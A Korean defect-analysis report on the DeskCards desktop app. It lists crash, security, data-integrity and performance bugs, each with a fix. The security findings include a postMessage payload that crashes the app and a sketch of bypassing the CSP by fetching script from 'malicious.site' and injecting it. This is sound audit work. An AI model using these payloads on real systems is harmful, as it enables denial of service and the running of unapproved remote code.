# DeskCards 코드 리뷰 및 정밀 결함 분석 보고서

본 문서는 DeskCards 코드베이스(`v:\desktop\deskfolders`)를 대상으로 읽기 전용 정적 분석 및 런타임 동작 검증을 거쳐 작성된 결함 분석 보고서입니다.

---

## 1. 결함 요약 (Summary Matrix)

| 구분 | 심각도 | 항목 | 영향 및 위험도 | 파일 위치 |
|---|---|---|---|---|
| **01** | **High** | `DardView.OnMessage` 타입 캐스팅 미처리로 인한 프로세스 크래시 | 악의적 웹 메시지 한 줄로 앱 전체 강제 종료 (DoS) | `src/DeskCards/DardView.cs:282` |
| **02** | **High** | CSP `'unsafe-inline'` 허용으로 인한 원격 임의 코드 실행 | 승인되지 않은 외부 JS 동적 로드 및 실행 (보안 전제 무력화) | `src/DeskCards/DardView.cs:185` |
| **03** | **High** | `DardProxy` 임의 포트 허용 및 유휴 연결 무한 누수 | 일반 TCP 터널 악용, 소켓 및 Task 영구 누수 | `src/DeskCards/DardProxy.cs:55, 116` |
| **04** | **Medium** | `GroupManager.DeleteGroup` 부분 이동 후 중단 결함 | 이동 실패 시 롤백 없이 파일 파편화 및 상태 불일치 | `src/DeskCards/GroupManager.cs:662` |
| **05** | **Medium** | `FileOps.Unique`의 점(dot) 파일 선두 공백 생성 버그 | `.gitignore` 등 중복 시 ` (2).gitignore` 공백 파일 생성 | `src/DeskCards/FileOps.cs:183` |
| **06** | **Medium** | 업데이트 시 `version.txt` 및 보조 파일 미동기화 | 앱 업데이트 후에도 설치 디렉터리에 과거 버전 정보 잔존 | `installer/.../SetupEngine.cs:60`<br>`src/DeskCards/Updater.cs:118` |
| **07** | **Medium** | `App.WaitForUpdatedFrom` PID 재활용 시 15초 기동 지연 | 구버전 PID가 다른 프로세스에 할당될 경우 15초 블로킹 | `src/DeskCards/App.xaml.cs:123` |
| **08** | **Low** | `GroupModel.Reload` 시 UI 스레드 동기 Shell I/O 프리징 | 오프라인 네트워크 드라이브 바로가기 존재 시 UI 먹통 | `src/DeskCards/ShellIcons.cs:55` |
| **09** | **Low** | `EdgeBar` 40ms 무한 폴링으로 인한 CPU 유휴 상태 방해 | 상시 초당 25회 디스패처 기상, 노트북 배터리 효율 저하 | `src/DeskCards/EdgeBar.cs:42` |
| **10** | **Low** | 주요 비동기 진입점들의 `async void` 사용 | 예외 발생 시 비정상 종료 직행 위험 | `src/DeskCards/GroupManager.Dards.cs:230` 등 |
| **11** | **Low** | 탐색기 재시작 시 N개 카드의 중복 `Reconcile` 호출 | Progman 복구 시 불필요한 연속 디렉터리 스캔 | `src/DeskCards/GroupManager.cs:541` |

---

## 2. [High] 보안 및 안정성 치명 결함

### 01. `DardView.OnMessage` 타입 캐스팅 미처리로 인한 프로세스 크래시 (DoS)
- **코드 위치**: `src/DeskCards/DardView.cs:324, 331`
- **상세 분석**:
  ```csharp
  // DardView.cs
  case "cards.post":
      string to = (string?)args?["to"] ?? "";
  case "openUrl":
      string url = args?.GetValue<string>() ?? "";
  ```
  .NET `System.Text.Json.Nodes.JsonNode`는 노드가 `JsonObject`가 아닌 상태에서 인덱서(`node["key"]`)를 호출하거나, `JsonValue`가 아닌 상태에서 `node.GetValue<T>()`를 호출할 경우 `null`을 반환하지 않고 **`InvalidOperationException`을 던집니다.**
  `OnMessage` 핸들러는 `catch (DardCallException)`만 잡고 있으며, `App.xaml.cs`에는 전역 `DispatcherUnhandledException` 핸들러가 없습니다.
- **실제 영향**:
  카드 내부 웹페이지 스크립트가 `window.chrome.webview.postMessage({ t: 'call', id: 1, fn: 'openUrl', args: { foo: 1 } })` 또는 `fn: 'cards.post', args: 123`를 전송하면 즉시 UI 스레드가 크래시되어 **바탕화면의 DeskCards 앱 프로세스 전체가 강제 종료**됩니다.
- **수정 방향**:
  `Handle` 메서드 또는 `OnMessage`의 `try-catch`에서 `Exception` 전반(특히 `InvalidOperationException`, `InvalidCastException`)을 잡아 `DardCallException("TypeError", ...)`로 변환하거나, 인자 파싱 전 `args is JsonObject obj && obj.TryGetPropertyValue(...)` 형태로 방어 검사를 수행해야 합니다.

---

### 02. CSP `'unsafe-inline'` 허용으로 인한 원격 임의 스크립트 실행
- **코드 위치**: `src/DeskCards/DardView.cs:185-190`
- **상세 분석**:
  ```csharp
  string csp = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'" + net + "; ...";
  ```
  코드 주석 및 설계 문서(`project.md`, `docs/dard-design.html`)에는 *"스크립트는 언제나 페이지 안에 있는 것만(승인한 뒤에 코드가 바뀌지 않게)"*이라고 명시되어 있습니다.
  그러나 W3C CSP 표준상 `script-src 'unsafe-inline'`은 동적으로 삽입되는 `<script>` 요소의 실행을 허용합니다.
- **실제 영향**:
  `internet` 권한을 가진 카드는 `fetch('https://malicious.site/remote.js')`로 임의 코드를 다운로드한 뒤 `document.createElement('script')`에 `textContent`로 삽입하여 즉시 실행할 수 있습니다.
  이로 인해 **"사용자가 처음에 SHA-256 해시로 검토·승인한 패키지 내 JS만 실행된다"는 보안 모델이 완전히 우회**됩니다.
- **수정 방향**:
  `'unsafe-inline'` 대신 패키지 내 `card.html` / `settings.html`의 인라인 스크립트 블록 SHA-256 해시 목록(`'sha256-...'`)을 로드 시 계산하여 CSP 헤더에 명시하거나, 논스(nonce) 기반 CSP로 전환해야 합니다.

---

### 03. `DardProxy` 임의 포트 허용 및 유휴 연결 무한 누수
- **코드 위치**: `src/DeskCards/DardProxy.cs:55-81, 116`
- **상세 분석**:
  - 포트 검증: `port is < 1 or > 65535`만 거르므로 공인 IP라면 25(SMTP), 22(SSH), 445(SMB) 등 모든 포트로의 CONNECT 터널을 허용합니다.
  - 소켓 릴레이:
    ```csharp
    var a = clientStream.CopyToAsync(upstreamStream);
    var b = upstreamStream.CopyToAsync(clientStream);
    await Task.WhenAny(a, b);
    ```
    초기 연결 타임아웃(`timeout.Token`)은 `CopyToAsync`에 전달되지 않습니다.
- **실제 영향**:
  1. 카드가 공인망의 임의 포트로 TCP 연결을 중계하는 프록시로 악용될 수 있습니다.
  2. 클라이언트나 서버가 연결을 끊지 않고 유휴(Idle) 상태로 방치할 경우, 타임아웃 없이 소켓과 `Task`가 영구 대기하여 메모리 누수가 누적됩니다.
  3. `Task.WhenAny` 완료 후 스트림 해제 시 반대편 `CopyToAsync`에서 발생하는 `ObjectDisposedException`이 Unobserved Exception으로 방치됩니다.
- **수정 방향**:
  프록시 대상 포트를 표준 웹 포트(80, 443 등)로 제한하고, 양방향 스트림 릴레이에 유휴 타임아웃을 적용하며, 연결 종료 시 양쪽 소켓을 정상 정리(`Shutdown`)한 뒤 수거해야 합니다.

---

## 3. [Medium] 데이터 손실 및 무결성 결함

### 04. `GroupManager.DeleteGroup` 부분 이동 후 중단 결함
- **코드 위치**: `src/DeskCards/GroupManager.cs:662-674`
- **상세 분석**:
  ```csharp
  foreach (var path in entries)
      if (!FileOps.MoveTo(path, FileOps.UserDesktop)) return false;
  Directory.Delete(g.Folder, recursive: false);
  ```
  파일 10개를 바탕화면으로 이동하는 도중 4번째 파일이 다른 프로세스에 잠겨 있거나 권한 오류로 `MoveTo`가 실패하면 즉시 `return false`로 종료됩니다.
- **실제 영향**:
  이미 이동된 1~3번 파일은 롤백되지 않고 바탕화면에 남고, 4~10번 파일은 그룹에 그대로 남습니다. 그룹은 삭제되지 않은 채 사용자의 파일들이 바탕화면과 그룹 폴더 양쪽으로 분할 파편화되는 데이터 일관성 훼손이 발생합니다.
- **수정 방향**:
  이동 전 파일 잠금 및 쓰기 권한을 사전 검증하거나, 실패 시 이미 이동한 파일들을 원래 폴더로 되돌리는 트랜잭션 롤백 로직을 구현해야 합니다.

---

### 05. `FileOps.Unique`의 점(dot) 파일 선두 공백 생성 버그
- **코드 위치**: `src/DeskCards/FileOps.cs:183-186`
- **상세 분석**:
  ```csharp
  string stem = Path.GetFileNameWithoutExtension(name), ext = Path.GetExtension(name);
  for (int i = 2; ; i++) {
      dest = Path.Combine(folder, $"{stem} ({i}){ext}");
  ```
  `name`이 `.gitignore`인 경우 .NET의 `Path.GetFileNameWithoutExtension`은 빈 문자열(`""`)을 반환합니다.
- **실제 영향**:
  중복 시 생성되는 파일명이 ` (2).gitignore`(선두에 스페이스 공백 1칸)로 생성됩니다. 윈도우 파일 시스템에서 선두 공백은 Win32 탐색기 및 명령줄 도구에서 트림되거나 비정상 처리될 위험이 있습니다.
- **수정 방향**:
  `string.IsNullOrEmpty(stem)`인 경우 `name` 전체 뒤에 접미사를 붙이도록 분기 처리해야 합니다 (예: `.gitignore (2)`).

---

### 06. 업데이트 시 `version.txt` 및 보조 파일 미동기화
- **코드 위치**: `installer/DeskCards.Setup/SetupEngine.cs:60`, `src/DeskCards/Updater.cs:118`
- **상세 분석**:
  `SetupEngine.cs`와 `UpdatePackage.Apply` 모두 기존 설치 폴더에 업데이트를 덮어쓸 때 `DeskCards.exe` 단 1개 파일만 복사/이동합니다.
- **실제 영향**:
  릴리스 아카이브에 포함된 `version.txt`가 업데이트되지 않아, 설치 디렉터리에 구버전 `version.txt`가 영구히 남게 됩니다. 추후 배포 패키지에 추가 파일이 도입될 경우 업데이트 시 누락되는 구조적 취약점이 됩니다.
- **수정 방향**:
  `DeskCards.exe` 외에도 스테이징 폴더의 `version.txt` 및 배포 아티팩트를 설치 디렉터리로 함께 동기화해야 합니다.

---

### 07. `App.WaitForUpdatedFrom`의 PID 재활용 시 15초 기동 지연 버그
- **코드 위치**: `src/DeskCards/App.xaml.cs:123-125`
- **상세 분석**:
  ```csharp
  using var old = Process.GetProcessById(pid);
  old.WaitForExit(15000);
  ```
- **실제 영향**:
  이전 프로세스가 종료된 직후 Windows OS가 해당 PID를 다른 시스템 프로세스(svchost 등)에 재할당한 경우, 프로세스 이름 검사(`old.ProcessName == "DeskCards"`)가 없어 엉뚱한 시스템 프로세스가 종료될 때까지 **앱 시작이 최대 15초 동안 멈추게 됩니다.**
- **수정 방향**:
  `old.ProcessName.Equals("DeskCards", StringComparison.OrdinalIgnoreCase)` 검사를 추가해야 합니다.

---

## 4. [Low] 성능 저하 및 운영 안정성

### 08. `GroupModel.Reload` 시 UI 스레드 동기 Shell I/O 프리징
- **코드 위치**: `src/DeskCards/ShellIcons.cs:55`, `src/DeskCards/GroupModel.cs:88`
- **상세 분석**:
  그룹 폴더 내에 오프라인 상태인 네트워크 드라이브(UNC 경로 `\\nas\share\...`) 바로가기가 포함된 경우, `ShellIcons.Get()`의 `SHCreateItemFromParsingName`이 네트워크 응답을 기다리며 최대 수십 초 동안 UI 스레드를 블로킹하여 **앱 전체가 '응답 없음'으로 프리징**됩니다.
- **수정 방향**:
  아이콘 로딩을 비동기/백그라운드 스레드로 위임하고 UI는 기본 아이콘을 먼저 표시해야 합니다.

---

### 09. `EdgeBar` 40ms 무한 폴링으로 인한 CPU 유휴 상태 방해
- **코드 위치**: `src/DeskCards/EdgeBar.cs:42-45`
- **상세 분석**:
  앱이 실행되는 동안 아무런 조작이 없어도 1초에 25회씩 UI 스레드를 깨워 `GetCursorPos`, `Screen.FromPoint`, `KeyCombo.IsDown`을 검사합니다.
- **실제 영향**:
  노트북 배터리 사용 시 CPU의 Deep Sleep(C-state) 진입을 방해하여 배터리 수명에 악영향을 미칩니다.
- **수정 방향**:
  유휴 시 타이머 간격을 늘리거나(200~300ms), 저수준 마우스 훅 또는 키보드 이벤트 방식으로 개선할 수 있습니다.

---

### 10. 주요 비동기 진입점들의 `async void` 사용
- **코드 위치**:
  - `src/DeskCards/GroupManager.Dards.cs:230` (`MoveDardStorage`)
  - `src/DeskCards/GroupManager.Dards.cs:433` (`DeleteDardStorage`)
  - `src/DeskCards/GroupManager.DardIssues.cs:108` (`MeasureDardUsage`)
- **상세 분석**:
  비동기 백그라운드 작업들이 `async void`로 작성되어 있어, 메서드 내부에서 캐치되지 못한 예외가 발생할 경우 상위 호출자로 전달되지 않고 `SynchronizationContext`를 통해 프로세스 비정상 종료를 유발합니다.
- **수정 방향**:
  `async Task`로 변경하고 호출부에서 안전하게 await 및 예외 처리를 해야 합니다.

---

### 11. 탐색기 재시작 시 N개 카드의 중복 `Reconcile` 호출
- **코드 위치**: `src/DeskCards/GroupManager.cs:541-551`
- **상세 분석**:
  Progman이 재시작될 때 N개 카드의 `OnCardClosed`가 일제히 호출되어 N개의 `DispatcherTimer`가 등록됩니다. 카드가 중복 생성되지는 않으나(`_cards.ContainsKey` 방어), 8~10회의 불필요한 디렉터리 재탐색 및 카드 확인 작업이 연속으로 실행됩니다.
- **수정 방향**:
  `GroupManager` 수준에서 단일 디바운스 타이머로 병합해야 합니다.

---

## 5. 부록: 검증 결과 무해/오탐으로 판정된 항목

1. **`DeskCard`의 `HwndSource.RemoveHook` 누수 의심**:
   - **판정: 무해 (False Positive)**
   - WPF의 `Window.Close()`는 창 파괴(`WM_NCDESTROY`) 시 `HwndSource.Dispose()`를 내부 호출하며, `HwndSource`가 자신의 `_hooks` 리스트를 스스로 `null`로 초기화합니다. 따라서 윈도우 닫힘 시 GC 누수가 발생하지 않습니다.
2. **`Config.Save` 백그라운드 동시성 충돌 의심**:
   - **판정: 무해 (False Positive)**
   - `Updater`의 비동기 콜백은 WPF Dispatcher 문맥으로 복귀하여 실행되므로, `Config`의 모든 수정 및 저장 호출은 단일 UI 스레드에서만 순차 실행됩니다. 별도 스레드 충돌 위험은 없습니다.
3. **`BalloonTip.Show` 및 `Path.GetTempFileName()` 고갈 의심**:
   - **판정: 극히 희박 (Inconsequential)**
   - `BalloonTip`은 드문 배치 경고 시 1회만 호출되며, `GetTempFileName`은 64MB 초과 대용량 이전 시에만 `DeleteOnClose`로 임시 사용되므로 고갈 가능성이 거의 없습니다.
